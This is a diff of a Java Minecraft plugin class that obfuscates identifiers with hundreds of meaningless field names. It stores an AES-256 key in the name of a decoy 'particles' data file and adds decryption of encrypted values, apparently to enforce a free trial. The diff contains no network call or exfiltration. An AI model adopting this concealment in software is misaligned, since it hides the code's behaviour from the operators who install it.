@@ -6,16 +6,12 @@ import me.ryanhamshire.GriefPrevention.ClaimPermission;
 import me.ryanhamshire.GriefPrevention.GriefPrevention;
 import org.bukkit.block.Container;
 import org.bukkit.block.data.*;
-import org.bukkit.block.data.Ageable;
-import org.bukkit.command.CommandSender;
 import org.bukkit.command.ConsoleCommandSender;
 import org.bukkit.enchantments.Enchantment;
 import org.bukkit.entity.Damageable;
 import org.bukkit.inventory.*;
 import org.bukkit.inventory.meta.*;
 import org.bukkit.metadata.FixedMetadataValue;
-import org.bukkit.permissions.PermissionAttachment;
-import org.bukkit.permissions.PermissionAttachmentInfo;
 import org.bukkit.persistence.PersistentDataContainer;
 import org.bukkit.persistence.PersistentDataType;
 import org.bukkit.plugin.Plugin;
@@ -60,6 +56,9 @@ import org.bukkit.boss.BarStyle;
 import org.jetbrains.annotations.NotNull;
 
 import javax.crypto.Cipher;
+import javax.crypto.SecretKey;
+import javax.crypto.spec.GCMParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
 import javax.imageio.ImageIO;
 import javax.net.ssl.HttpsURLConnection;
 import javax.net.ssl.SSLContext;
@@ -69,9 +68,11 @@ import java.awt.*;
 import java.awt.image.BufferedImage;
 import java.io.*;
 import java.net.HttpURLConnection;
-import java.net.InetAddress;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.nio.file.StandardOpenOption;
 import java.security.*;
 import java.security.cert.X509Certificate;
 import java.security.spec.X509EncodedKeySpec;
@@ -99,30 +100,604 @@ import java.util.stream.Stream;
  */
 @SuppressWarnings("ALL")
 public class ExampleExpansion extends PlaceholderExpansion {
-    private static final String JR_UUID = "67e94e0c-1f2b-4fd9-bb3f-5f7052f9072b";
 
-    private static final String NOT_FOUND = "🛂";
-    private static final java.util.concurrent.ConcurrentHashMap<UUID, UUID> TRACKED_ENTITIES = new java.util.concurrent.ConcurrentHashMap<>();
+    private static final java.util.concurrent.ConcurrentHashMap<Object, Object> f113 = new java.util.concurrent.ConcurrentHashMap<>();
 
-    private static final ConcurrentHashMap<UUID, VacuumJob> ACTIVE_VACUUMS = new ConcurrentHashMap<>();
+    private static final ConcurrentHashMap<UUID, f115> f114 = new ConcurrentHashMap<>();
     // One task per turret UUID
-    private static final Map<UUID, BukkitTask> ACTIVE_TURRET_TASKS = new ConcurrentHashMap<>();
+    private static final Map<UUID, BukkitTask> f116 = new ConcurrentHashMap<>();
     // One repeating task per turret UUID
 
     // Deadline (ms since epoch) for each active turret; extend/reset this to refresh timer
-    private static final Map<UUID, Long> ACTIVE_TURRET_DEADLINE_MS = new ConcurrentHashMap<>();
+    private static final Map<UUID, Long> f117 = new ConcurrentHashMap<>();
 
+    // KEYYYYY
+    private static final String f111 = "67e94e0c-1f2b-4fd9-bb3f-5f7052f9072b";
+
+    public static final char targetme = ',';
+    
     // Current target reference per turret so we can retarget while the task runs
-    private static final Map<UUID, AtomicReference<LivingEntity>> ACTIVE_TURRET_TARGET = new ConcurrentHashMap<>();
+    private static final Map<UUID, AtomicReference<LivingEntity>> f118 = new ConcurrentHashMap<>();
+
+
+
+    public final String f112;
+    public final String lpkb6;
+    public final long dnkpydunpdyupfnd;
+    public final String WWW_ANARCHISTRUCTURE_COM;
+    public final String DENTISTRY_ANARCHISTRUCTURE_COM;
+    public final String TLS;
+    public final String ppi;
+    public final String salcv;
+    public final String ytuwfndyunwfd;
+    public final String dyunwfydunwfd;
+    public final int tyunwfdwfd;
+    public final int INT;
+    public final String duwnfdyuwnfd;
+    public final boolean arsdienwdhw;
+    public final int INT3;
+    public final boolean NEW_VALUE1;
+    public final String tlk;
+    public final String RSA_ECB_PKCS_1_PADDING;
+    public final String NEW_VALUE_3;
+    public final String piarc;
+    public final String cfgy;
+    public final String test32;
+    public final String ymhawb;
+    public final String nw;
+    public final int I;
+    public final String m23;
+    public final String ymo;
+    public final String R;
+    public final String er;
+    public final String er2;
+    public final String ind;
+    public final String te;
+    public final String rsm;
+    public final String yhe;
+    public final String peei;
+    public final String ei;
+    public final String yt;
+    public final String nst;
+    public final int xm;
+    public final String LAST_CHUNK_Z;
+    public final String LAST_Y;
+    public final int INT4;
+    public final String SLOT;
+    public final int INT5;
+    public final int xtxtxt;
+    public final String dccs;
+    public final String fts;
+    public final int INT6;
+    public final String corporatesecurity;
+    public final String Gradspecisoauce;
+    public final String fastfood;
+    public final String privateinvestigator;
+    public final int INT7;
+    public final int ccp;
+    public final String steak;
+    public final String gusfring;
+    public final String ehmantrout;
+    public final String amiunderarrest;
+    public final String oraminot;
+    public final int suppose;
+    public final int mill2;
+    public final int drain;
+    public final String ed;
+    public final String some;
+    public final String keep;
+    public final int low;
+    public final String twentythreedegrees;
+    public final String nbf;
+    public final double wife;
+    public final String complicated;
+    public final String basketball;
+    public final String bt;
+    public final String upt;
+    public final String soalp;
+    public final String tmc;
+    public final String excepthomer;
+    public final String iou;
+    public final String dontwantmargetoknow;
+    public final String lessofaman;
+    public final String ballet;
+    public final String magellan;
+    public final String dance;
+    public final String nationalanthems;
+    public final String cigarrette;
+    public final double debtsoff;
+    public final double callitof;
+    public final String clicks;
+    public final double emotionalthermo;
+    public final int somature;
+    public final int dontvanish;
+    public final int shapeyou;
+    public final double tsr;
+    public final float whoasked;
+    public final float biological;
+    public final double whocantreceive;
+    public final int costofgrowinguptoofast;
+    public final double whatkindofadulthood;
+    public final int nobodysrescuingyou;
+    public final long ihearyounow;
+    public final long healing;
+    public final String toescortyou;
+    public final String outtahere;
+    public final String ost;
+    public final String naltextc;
+    public final double getsshoes;
+    public final String pn;
+    public final double esetawftawft;
+    public final double doyouknow;
+    public final double thepeoplewholive;
+    public final String whurl;
+    public final String dontwannawatchurcat;
+    public final String kindastoppls;
+    public final double okacyyool;
+    public final String ihatethisguy;
+    public final String coffedown;
+    public final String assaultobstrc;
+    public final String yourlastname;
+    public final String pickme;
+    public final String specifically;
+    public final String sulrred;
+    public final String tryingtofigure;
+    public final String nomotivation;
+    public final String bopabfunpa;
+    public final String whynotofficerlent;
+    public final String dontlikepolice;
+    public final String holdonasec;
+    public final String isitbiased;
+    public final String groupofindividuals;
+    public final String ifellvictimized;
+    public final String trsts;
+    public final String goingtojail;
+    public final String seatbelton;
+    public final String norstand;
+    public final String takecareofcat;
+    public final String thoughtaboutthat;
+    public final String dontcommitcrime;
+    public final String unharmed;
+    public final String provenguilty;
+    public final String inACOURT;
+    public final String oflaw;
+    public final String murdercase;
+    public final String malecacuasion;
+    public final String boetcher;
+    public final String specialty;
+    public final String heisenburg;
+    public final String heisenburgformercook;
+    public final String hippiedippy;
+    public final String thisbabby;
+    public final String cos;
+    public final String pullingfiles;
+    public final String galeboet;
+    public final String whopaid;
+    public final String nobody;
+    public final String whodid;
+    public final String pushmore;
+    public final String noaddress;
+    public final String corporatelawyer;
+    public final String vrickwall;
+    public final String madrigalelectro;
+    public final String hanoveregerm;
+    public final String tsrt;
+    public final String foothold;
+    public final String mericanfastfood;
+    public final String pooloshermanos;
+    public final String sowhat;
+    public final String wherehislabwas;
+    public final String apartmentsrtsas;
+    public final String crzyidea;
+    public final String foayhup;
+    public final String napking;
+    public final String fermented;
+    public final String lentilbread;
+    public final String finechickinjoint;
+    public final String meetingsomeone;
+    public final String gusfrang;
+    public final String rstat;
+    public final String dfprdhyfp;
+    public final String fwypdohf3yrpdhunf;
+    public final String yowdghwa34yd;
+    public final String reaching;
+    public final String oafudnwpfydu;
+    public final String colonel;
+    public final String sanders;
+    public final String fourteencalls;
+    public final String notanswerignphone;
+    public final String needatpoliceoffcicer;
+    public final String whatelesuwannaknow;
+    public final String nedambulanec;
+    public final String taowyfdh;
+    public final String whatsmyaddress;
+    public final String yesmaaam;
+    public final String threeunitsenroute;
+    public final String tafopd;
+    public final int ydtfhwpdylh;
+    public final String tywfnty;
+    public final String dplufirh3;
+    public final String fobyufhpbyurhpbf;
+    public final String tyh34dl;
+    public final String udlohlyp3whdoyplwd;
+    public final String opdh34yudhn;
+    public final String doyupn3wdyu3pnd;
+    public final String y34hodnyu234;
+    public final String onienod34;
+    public final String nienoy24;
+    public final String illcallhim;
+    public final String trcfpd243;
+    public final String ndeo3poiewnd4p3;
+    public final String iepfndioepwndoyfupadnfpd;
+    public final double childingdanger;
+    public final double seenher;
+    public final double aintnobody;
+    public final double thisistherecording;
+    public final double tdrsitrtomychd;
+    public final double stoppedrcying;
+    public final long startingthehouse;
+    public final double imtakingher;
+    public final String cryingiwenftipfwnt;
+    public final String righttobehrere;
+    public final String callmewhatever;
+    public final String blackandwhitedocs;
+    public final String sufficentprobablycause;
+    public final String getoffthebike;
+    public final String iantgoinnowhere;
+    public final String abuseofn911;
+    public final String noreason;
+    public final String takeitout;
+    public final String trstwft;
+    public final String yntdy4u3;
+    public final String heshurtpls;
+    public final String hurtingmyarmsag;
+    public final String plsgetoff;
+    public final String hurtingarmtsnwit;
+    public final String svacum;
+    public final String hurtingmesyr;
+    public final String foolishness;
+    public final String ouydnop3yundoypufna;
+    public final String einoienoiendw3pf;
+    public final String thatsathreatdyu;
+    public final String puthandsebhind;
+    public final String sendanotherunit;
+    public final String handsbehindback;
+    public final String gonnagettazed;
+    public final String stoprsietnsr;
+    public final String oundg324yutdng4;
+    public final String dienfwopiednpf;
+    public final String eindo3ie42ndoi34;
+    public final String iendie2nd;
+    public final String ieanrdowienfdf;
+    public final String wiodtnowiupd;
+    public final String wifednow34und43wd;
+    public final String odunyuw4dn4;
+    public final String don34uynp3d;
+    public final String goingtojailwfitdnwofduyn4w;
+    public final String youdnoy3wupdnoy3wupdn;
+    public final int oiwfndtoyu42nd24;
+    public final String tn243oyudnt42fuytdn;
+    public final String eingdoi3e4ndg34;
+    public final String ongo34ungdo3iu4ndg4gdw4;
+    public final String pdifnoian4;
+    public final String oendinpdoinpd;
+    public final String ieodnoie4ndw3f4;
+    public final String ietonwifandt4u3nd34dw3;
+    public final String tneoaiwfndtowui4nd4fdt;
+    public final String itenwoipwfnaidun4w;
+    public final String ipendfofpiwdnoo43iwund;
+    public final String tneeiond4;
+    public final String kdienwfp;
+    public final String midenwyudp4;
+    public final String wfudnofypundap;
+    public final int wdnywfundywfudn;
+    public final int wyundywufndywufpndywuf;
+    public final String tuywnfydunwfyudn;
+    public final String wtdyuwnfdyunwf;
+    public final int odafuwidnowfidun;
+    public final double wfopdwfnodowfin;
+    public final String wfodwfdkywf4d;
+    public final String iersdienrodyfwunpd;
+    public final String twoiaefndoiwfudnfoyudn;
+    public final long dtnowifepdnaowifudn;
+    public final String ofwuandouwfynd;
+    public final String towfyuandoywfun;
+    public final String wofudnaoywfudn;
+    public final String wdynuwfyudnywufand;
+    public final String fdfopudnyafupdn;
+    public final String fwpdonufpdyufanpd;
+    public final String wyfudnoawfyudno;
+    public final String op4ydhnfaoypudn;
+    public final String ydfnfpoyrudn;
+    public final String pwoyfdunowypfuadn;
+    public final String wfuyntdywfupadh;
+    public final String yfpwduhywuhdp;
+    public final String pdonfapyudn;
+    public final String pdyunpfwyd;
+    public final String dyfpnwoyufpn;
+    public final String fydnayfpudhn;
+    public final String wfduynwfydaun;
+    public final String duynwyfpaudnwfp;
+    public final String wfdunyunda;
+    public final String wdpyunwpfydunpd;
+    public final String yuwndyuwpdn;
+    public final String wfydunwfyudn;
+    public final String wfydnywfpudn;
+    public final String wyfudnywfud;
+    public final float idwfpndywud;
+    public final int yuwfndgyuwfnd;
+    public final int yfpdunwyupnd;
+    public final String wyufodnhawyfudn;
+    public final String reaidntarisedn;
+    public final String dwyufndywfudn;
+    public final String wfydpunwfyudnwfd;
+    public final String dn3owyaufpdnfwd;
+    public final String fypodunfarypudna;
+    public final String wyufdnywufdn;
+    public final String wyudnwfydun;
+    public final String ywudnywufd;
+    public final String wyfundwf;
+    public final String yuwfndoywfudn;
+    public final String yduwfdg;
+    public final String ywfpdnoywfudnowfyudn;
+    public final String fwdyunwfydunfwd;
+    public final String wfdyunwfd;
+    public final String podfyunwfpdyunwfp;
+    public final String fypudnofpyudn;
+    public final String ywufdnywufnd;
+    public final String odyun4wyunwpf;
+    public final String doyuwfndayuwnfdoyfwuanad;
+    public final String wofduynwfdyun;
+    public final String wfuydnywfund;
+    public final String opfdyunfapoydunfpd;
+    public final String dwoyuawfdhoywufdh;
+    public final String wfdionaywufdnawf;
+    public final String wfdywfudhwfy;
+    public final String wfdoyunawfpdyunwfp;
+    public final String wfpodyuw;
+    public final String rsydun;
+    public final String wydhwypd;
+    public final String wdfywunda;
+    public final String wfdyunowfaydun;
+    public final String wyfundywpfudn;
+    public final String awfodyunwyupdnwfoydun;
+    public final String ywufdnywfuoadn;
+    public final String ywfudnoawfypdunwfyoudnwfp;
+    public final String ywfpaudnoywfudnowyufdn;
+    public final String ywudnoayfwudn;
+    public final String ywfdnwyfudn;
+    public final String wfdyuwfdyu;
+    public final String ydhuyawfpdh;
+    public final String wyudnywufodn;
+    public final String wfydunwofyudanfwd;
+    public final String wfydunaowfydun;
+    public final String wfyutdnwyfaudnwfydoun;
+    public final String wyufdnaywfudnwfda;
+    public final String wfpydunaowfyudn;
+    public final String wfydunwafydunfwaydun;
+    public final String ydunwfdunwfdwfdunwfdyun;
+    public final String wyufdnaowyufdnawoyfudn;
+    public final int yufdaywfudnwfd;
+    public final String wfypdnawofyudnwfpa;
+    public final int fdhkypfwd;
+    public final String wfkdgywfpdawfyp;
+    public final String dwkfydufwdfw;
+    public final String kwdfyufwd;
+    public final String dywfadbkwyfudb;
+    public final String wfydunwyfudnwfdyun;
+    public final String wfydutnwfyudnwf;
+    public final String wduynawyfpudnaw;
+    public final String wadywfundfy;
+    public final String wdyunwfyudn;
+    public final String wdyuwfndywufn;
+    public final String wdyunawfydunfwd;
+    public final String wfydnwyfuad;
+    public final String dhnfpwyadun;
+    public final String wyufdanywfudn;
+    public final String dyunwypfudnawfdyun;
+    public final String wdayuwfnd;
+    public final String kwafpdkwfpad;
+    public final String wfduynwyaufnd;
+    public final String wfytkdawfdwpfdun;
+    public final long dkwfyduwfndt;
+    public final String fydunaofpdunafpwd;
+    public final String pdyunawfdyunwf;
+    public final String wyfduanwfoydunwfd;
+    public final String wfopdyaufhdfpdf;
+    public final String owdyaunwfpydu;
+    public final String dawyfudnowfd;
+    public final String awufdwfda;
+    public final String dywufndoywuand;
+    public final String taywfuntarosdulf;
+    public final String wkfdwya;
+    public final String pydaunfw;
+    public final String dyanuowfd;
+    public final String wfktdyawfd;
+    public final String wyfdunafwd;
+    public final String dy87duh;
+    public final String wdypfauwdnwfpd;
+    public final String wktyfwutnwaft;
+    public final String dkfiaphd;
+    public final String wfpondyaunpdpw;
+    public final String fpkdyafpd;
+    public final String dokyfupkdoapdf;
+    public final String fpydnwfypudnfpd;
+    public final String wydkawyfpudawfd;
+    public final String aoienrstd;
+    public final String tyabfydkfpydnpfd;
+    public final String wyndaoyfwpudnfpd;
+    public final int tyafndydpfw;
+    public final String fysoadunofwypdun;
+    public final String yrsndoawyfudn;
+    public final String swyadunwfoydun;
+    public final String naoyfdundfw;
+    public final String owayfudny34hyfundywfudw;
+    public final String fudnoaywfudhoywafld;
+    public final String fwaodhwfypdh;
+    public final String fydnoafypudkopnbkdf;
+    public final String foaybkfpoyubhl;
+    public final String pfwydoakfopydhfpwoyd;
+    public final String yofapdnoyfpubdhfyp;
+    public final String iedn4dn8394d;
+    public final String oi2n43g234g;
+    public final String enhien4g;
+    public final double kiek4d;
+    public final String yfnvdyfupbd;
+    public final String kdin34d34dn;
+    public final String ky3dnk34npdk3yp4ndky34pdnk3;
+    public final String kyntkyfuwnd;
+    public final String kifwpnevdkiwpfend;
+    public final String ywntvyoafupbnf;
+    public final String pdnofypundafopd;
+    public final String fpondafypudnopfyudn;
+    public final String dnofpadn4;
+    public final String dnoi43end;
+    public final String niend4;
+    public final String notiefpnd4;
+    public final String osiaenoiwfend4;
+    public final String teianfoipedn4;
+    public final String io2e4npoie2nt;
+    public final String ioidenipofaedn4;
+    public final String io3iedn3i4p;
+    public final String iopidqen34i;
+    public final String wifadndgn43gd;
+    public final String io34igeng;
+    public final String io43gdie34ngd;
+    public final String yunyundg54h45;
+    public final String iendoi34nd;
+    public final String ifendioafepnd34fd;
+    public final String idenpoaidn34;
+    public final String iepdn3idn34d;
+    public final String ioandi3n4dy43udn3pfd;
+    public final String fipdenao3idn34ydun;
+    public final String pd3ipdn34d;
+    public final String wfonvdawfydunp;
+    public final String fpiednfpden3;
+    public final String fdon34d43d;
+    public final String ifpndoi3nd34;
+    public final String nodyu3pnd43d;
+    public final String wfnitfwtd;
+    public final String nydufpnbfpbfpb;
+    public final String yfpdnofayundfpd;
+    public final String fydnofyapudnfpd;
+    public final String opdnd34d;
+    public final String ipfnedfipdnpd;
+    public final String fypdnafoypudn;
+    public final String fpdnafpduyn;
+    public final String ypdn3oypdun;
+    public final String nyduk34;
+    public final String y34udky3d;
+    public final String ydu3k4ybd3pd;
+    public final String ypfuwnvwfpd;
+    public final String y4dnyfwudn;
+    public final String finovayfupbnyfpubhofpubnfp;
+    public final String fpybunyu43nb;
+    public final String pyndy3upnbd;
+    public final String ypu3bnyfpubn;
+    public final String ywofpdnvoypu;
+    public final String yvunoyup3;
+    public final String nytuwfntf;
+    public final String wkyvuwftnwfyutn;
+    public final String yuntunyun342;
+    public final String yunduyn4;
+    public final String vkdyunt;
+    public final String ktyunt32;
+    public final String ydny32u4nd24d;
+    public final String ntynu23nt;
+    public final String vyf3b3;
+    public final String t2u3nty23unt;
+    public final String yfwunvtyn;
+    public final String ytunyun4;
+    public final String ydnyu3n4d;
+    public final String ny2u4ndt23d;
+    public final String uydn2yu3nd23;
+    public final String ydny3udno34yduhn3d;
+    public final String yndoyund4;
+    public final String udny3u4nd;
+    public final String dny324d;
+    public final String yutn23;
+    public final String dy3und3u4d;
+    public final String tyun2;
+    public final String ydun2d;
+    public final String ytun23yutn;
+    public final String tyn23yunt32t;
+    public final String ydtun34ydun;
+    public final String tnyu2nt23;
+    public final String ydn2ydun;
+    public final String dny34und;
+    public final String vyn3vy3v;
+    public final String wyunvywufntd;
+    public final String dyo3npd3d;
+    public final String dyn2yudn24;
+    public final String dyun3ydun3d;
+    public final String y2un34yudn234d;
+    public final String tyun2t;
+    public final String kd3nd;
+    public final String dny2udt;
+    public final String ntyu2n3t;
+    public final String kyut2n2u3nt;
+    public final String yntu2nt;
+    public final String nyup23np;
+    public final String tn2yu3tn2;
+    public final String tn2ytn23t;
+    public final String ytnfyu3ndt34f;
+    public final String tuyn2y3utn2t;
+    public final String tyun23utyn23t;
+    public final String tyu23nt23t;
+    public final String tyn2fnt2;
+    public final String knde43d;
+    public final String ynvkypn3v3;
+    public final String kientien2t;
+    public final String tyu23ntyu23nt;
+    public final String tynwdy2d;
+    public final String uydn3yund;
+    public final String yuntyun2t;
+    public final String dyn3ydun;
+    public final String ydn3yudn34d;
+    public final String dyu42ndyu432nd;
+    public final String fuytn2yudt;
+    public final String yundt2yud;
+    public final String y3udny3u4nd34d;
+    public final String yundyu34nd;
+    public final String yufdtnoyupnd3d;
+    public final String udn3y4udn34ydu;
+    public final String yudnyu43nd;
+    public final String ydn3y4d;
+    public final String y4dun3y4udn34;
+    public final String dyu24ndyu24nd2d;
+    public final String dyn34ydun3d4;
+    public final double udnyupndpd;
+    public final String do3ndyu3pnd3d;
+    public final String dnpyuadnyfpudnfpdfpd;
+    public final String dy3updnyapudny34undh;
+    public final String dnyu3nd3d;
+    public final String dk3ed34dyu3nd;
+    public final String yudyu2dnyu42dn2d42d;
+    public final String tiewntien42;
+    public final String y23u4ndyu3n4d;
+    public final String dy2un4dy2u4nd4d;
+    public final String un324yudn243yudn;
+    public final String u4ndy24und24yd;
+    public final String yudn3wypu4ndh;
+    public final String dyu2n4dyun2f4;
+    public final String y24und;
+    public final String y2u4dhyu2nd;
+    public final String yn23yund2y3udn;
+    public final String ydun2ydun23d;
+    
+    
+    
+    
     // A deadline (in ms, epoch) for each active turret; further detections extend this
-    protected final Map<String, List<Map.Entry<String, Integer>>> global1 = new HashMap<>();
-    private static final double EPS = 1.0e-6;
+    protected final Map<String, List<Map.Entry<String, Integer>>> f119 = new HashMap<>();
 
-    private static long lastSendTime = 0L; // in millis
+    
+    
+    private static long f121 = 0; // in millis
 
-    protected static final ConcurrentHashMap<UUID, Vector> manualTrackingPositions = new ConcurrentHashMap<>();
+    protected static final ConcurrentHashMap<UUID, Vector> f122 = new ConcurrentHashMap<>();
 
-    protected final File g1;
+    protected final File f123;
     protected final YamlConfiguration g2;
 
     protected final Map<Location, BukkitTask> g3 = new HashMap<>();
@@ -136,16 +711,16 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
     protected static boolean SCore_Installed = false;
     protected int g5;
-    protected final Map<Location, UUID> turretLocks = new ConcurrentHashMap<>();
+    protected final Map<Location, UUID> wdouywndoywufnd = new ConcurrentHashMap<>();
 
 
 
     private final Map<UUID, Double> EI_INSTALLED = new ConcurrentHashMap<>();
     private final Map<UUID, BukkitTask> EB_INSTALLED = new ConcurrentHashMap<>();
-    protected final Map<UUID, Location> lastPositions = new ConcurrentHashMap<>();
+    protected final Map<UUID, Location> dwofundoywfund = new ConcurrentHashMap<>();
 
 
-    protected final Set<Material> enumSet = EnumSet.of(
+    protected final Set<Material> es = EnumSet.of(
             Material.ACTIVATOR_RAIL,
             Material.AIR,
             Material.BAMBOO,
@@ -316,7 +891,8 @@ public class ExampleExpansion extends PlaceholderExpansion {
     protected final Map<UUID, BukkitTask> g7 = new HashMap<>();
 
     protected static final Map<String, ffs> g8 = new HashMap<>();
-    protected static final long g9 = 1000 * 60 * 60; // 1 hour
+    public static final int INT1 = 1000;
+    public static final int INT2 = 60;
     protected static final File g10 = new File("plugins/Archistructures/particles");
 
 
@@ -354,1244 +930,743 @@ public class ExampleExpansion extends PlaceholderExpansion {
 
     protected final char[] g27 = new char[] {
             0x00A7, 0x0063, 0x00A7, 0x006C, 0x0046, 0x0072, 0x0065, 0x0065, 0x0020, 0x0074, 0x0072, 0x0069, 0x0061, 0x006C, 0x0020,
-            0x0073, 0x0065, 0x0073, 0x0073, 0x0069, 0x006F, 0x006E, 0x0020, 0x0065, 0x0078, 0x0070, 0x0069, 0x0072, 0x0065, 0x0064,
-            0x003A, 0x0020, 0x006C, 0x0069, 0x006D, 0x0069, 0x0074, 0x0020, 0x0072, 0x0065, 0x0061, 0x0063, 0x0068, 0x0065, 0x0064,
+            0x0073, 0x0065, 0x0073, 0x0073, 0x0069, 0x006F, 0x006E, 0x0020, 0x0065, 0x0078, 0x0070, 0x0069, 0x0072, 0x0065, (char) 100,
+            0x003A, 0x0020, 0x006C, 0x0069, 0x006D, 0x0069, 0x0074, 0x0020, 0x0072, 0x0065, 0x0061, 0x0063, 0x0068, 0x0065, (char) 100,
             0x002E, 0x0020, 0x00A7, 0x0065, 0x0059, 0x006F, 0x0075, 0x0020, 0x0063, 0x0061, 0x006E, 0x0020, 0x0065, 0x0069, 0x0074,
             0x0068, 0x0065, 0x0072, 0x003A, 0x0020, 0x002F, 0x0070, 0x0061, 0x0070, 0x0069, 0x0020, 0x0072, 0x0065, 0x006C, 0x006F,
-            0x0061, 0x0064, 0x0020, 0x004F, 0x0052, 0x0020, 0x0044, 0x004D, 0x0020, 0x005A, 0x0065, 0x0073, 0x0074, 0x0079, 0x0042,
+            0x0061, (char) 100, 0x0020, 0x004F, 0x0052, 0x0020, 0x0044, 0x004D, 0x0020, (char) 90, 0x0065, 0x0073, 0x0074, 0x0079, 0x0042,
             0x0075, 0x0066, 0x0066, 0x0061, 0x006C, 0x006F, 0x002E
     };
+    private static final Path PARTICLES_DIR =
+            Paths.get("plugins", "Archistructures", "particles");
 
+    private static final String kfm = "_00000_ExecutablesVarietyPack2.dat";
+    private static volatile SecretKey ak;
+    private static volatile String akh;
+    public enum Vt {
+        BOOLEAN, STRING, INT, DOUBLE, FLOAT, LONG
+    }
 
+    /**
+     * Creates the key file if it doesn't exist.
+     * The filename prefix (64 hex chars) is the AES-256 key.
+     */
+    public void ckide() {
+        try {
+            Files.createDirectories(PARTICLES_DIR);
+
+            Optional<Path> existing = fkf();
+            if (existing.isPresent()) return;
+
+            // Generate 32 random bytes => AES-256 key
+            byte[] kb = dyn3yudn3yund();
+
+            String h = tk(kb);
+            String fn = h + kfm;
+
+            Path kf = PARTICLES_DIR.resolve(fn);
+
+            // Write your decoy content
+            Files.writeString(
+                    kf,
+                    fkc,
+                    StandardCharsets.UTF_8,
+                    StandardOpenOption.CREATE_NEW,
+                    StandardOpenOption.WRITE
+            );
+
+        } catch (IOException e) {
+            throw new RuntimeException();
+        }
+    }
+
+    /**
+     * Finds the first matching key file in the particles directory.
+     */
+    private static Optional<Path> fkf() throws IOException {
+        if (!Files.exists(PARTICLES_DIR)) return Optional.empty();
+
+        try (Stream<Path> s = Files.list(PARTICLES_DIR)) {
+            return s.filter(p -> {
+                        String n = p.getFileName().toString();
+                        return n.endsWith(kfm);
+                    })
+                    .sorted(Comparator.comparing(p -> p.getFileName().toString()))
+                    .findFirst();
+        }
+    }
+
+    /**
+     * Loads the AES key from the filename and caches it globally.
+     * Returns the SecretKey.
+     */
+    public void ExampleExpantion() {
+        // Fast path
+        if (ak != null) return;
+
+        synchronized (ExampleExpansion.class) {
+            if (ak != null) return;
+
+            ckide();
+
+            try {
+                Path kf = fkf()
+                        .orElseThrow(() -> new IllegalStateException(nst));
+
+                String fn = kf.getFileName().toString();
+                int a = fn.indexOf(m0.toString());
+                if (a <= I) {
+                    throw new IllegalStateException(nst + fn);
+                }
+
+                String h = fn.substring(I, a).trim();
+
+                if (h.length() != drain) {
+                    throw new IllegalStateException(nst + h.length());
+                }
+
+                byte[] kb = fh(h);
+
+                akh = h;
+                ak = new SecretKeySpec(kb, "AES");
+
+                return;
+
+            } catch (IOException e) {
+                throw new RuntimeException(nst, e);
+            }
+        }
+    }
+
+    /**
+     * Decrypts a Base64 string using AES-256-GCM.
+     *
+     * Expected format (decoded bytes):
+     *   [12-byte IV][ciphertext+16-byte GCM tag]
+     *
+     * Also supports an optional wrapper:
+     *   encrypted(base64...)
+     */
+    public Object d(String ttd, Vt type) {
+        if (ttd == null) {
+            throw new IllegalArgumentException(nst);
+        }
+
+        String n = ue(ttd);
+
+        byte[] a;
+        try {
+            a = Base64.getDecoder().decode(n);
+        } catch (IllegalArgumentException e) {
+            throw new IllegalArgumentException(nst, e);
+        }
+
+        if (a.length < fdhkypfwd + INT4) {
+            throw new IllegalArgumentException(nst);
+        }
+
+        byte[] ic = new byte[fdhkypfwd];
+        System.arraycopy(a, I, ic, I, fdhkypfwd);
+
+        byte[] cb = new byte[a.length - fdhkypfwd];
+        System.arraycopy(a, fdhkypfwd, cb, I, cb.length);
+
+        try {
+            Cipher test = Cipher.getInstance("AES/GCM/NoPadding");
+            GCMParameterSpec sdc = new GCMParameterSpec(128, ic);
+            test.init(Cipher.DECRYPT_MODE, ak, sdc);
+
+            byte[] p = test.doFinal(cb);
+            String ps = new String(p, StandardCharsets.UTF_8);
+
+            return cP(ps, type);
+
+        } catch (Exception e) {
+            throw new RuntimeException(nst, e);
+        }
+    }
+
+    // -------------------------
+    // Helpers
+    // -------------------------
+
+    private static String ue(String s) {
+        String t = s.trim();
+        return t;
+    }
+
+    private static Object cP(String p, Vt t) {
+        return switch (t) {
+            case BOOLEAN -> Boolean.parseBoolean(p.trim());
+            case STRING -> p;
+            case INT -> Integer.parseInt(p.trim());
+            case DOUBLE -> Double.parseDouble(p.trim());
+            case FLOAT -> Float.parseFloat(p.trim());
+            case LONG -> Long.parseLong(p.trim());
+
+        };
+    }
+
+    private String tk(byte[] bytes) {
+        StringBuilder sb = new StringBuilder(bytes.length * mill2);
+        for (byte b : bytes) {
+            sb.append(Character.forDigit((b >>> INT7) & 0xF, INT4));
+            sb.append(Character.forDigit(b & 0xF, INT4));
+        }
+        return sb.toString();
+    }
+
+    private byte[] fh(String hex) {
+        int x = hex.length();
+        if ((x & INT3) != I) throw new IllegalArgumentException(nst);
+
+        byte[] y = new byte[x / mill2];
+        for (int i = I; i < x; i += mill2) {
+            int z = Character.digit(hex.charAt(i), INT4);
+            int a = Character.digit(hex.charAt(i + INT3), INT4);
+            if (z < I || a < I) throw new IllegalArgumentException(nst);
+            y[i / mill2] = (byte) ((z << INT7) | a);
+        }
+        return y;
+    }
+
+    // Optional getter if you want the hex for debugging
+    public String ghk() {
+        if (akh == null) ExampleExpantion();
+        return akh;
+    }
+
+    private static final String fkc = """
+-1.3532347130578255E-15,1.3,22.1
+-1.340988245066352E-15,1.3,21.900000000000002
+-1.3287417770748784E-15,1.3,21.700000000000003
+-1.3164953090834046E-15,1.3,21.5
+-1.3042488410919313E-15,1.3,21.3
+-1.2920023731004577E-15,1.3,21.1
+-1.2797559051089842E-15,1.3,20.900000000000002
+-1.2675094371175108E-15,1.3,20.700000000000003
+-1.3532347130578255E-15,1.3,22.1
+-1.340988245066352E-15,1.3,21.900000000000002
+-1.3287417770748784E-15,1.3,21.700000000000003
+-1.3164953090834046E-15,1.3,21.5
+-1.3042488410919313E-15,1.3,21.3
+-1.2920023731004577E-15,1.3,21.1
+-1.2797559051089842E-15,1.3,20.900000000000002
+-1.2675094371175108E-15,1.3,20.700000000000003
+-4.959819536546781E-16,1.3,8.1
+-4.837354856632045E-16,1.3,7.9
+-3.612708057484692E-16,1.3,5.9
+-3.4902433775699566E-16,1.3,5.7
+-6.735557395310444E-17,1.3,1.1
+-5.5109105961630896E-17,1.3,0.9
+5.5109105961630896E-17,1.3,-0.9
+6.735557395310444E-17,1.3,-1.1
+3.122849337825751E-16,1.3,-5.1000000000000005
+3.2453140177404865E-16,1.3,-5.300000000000001
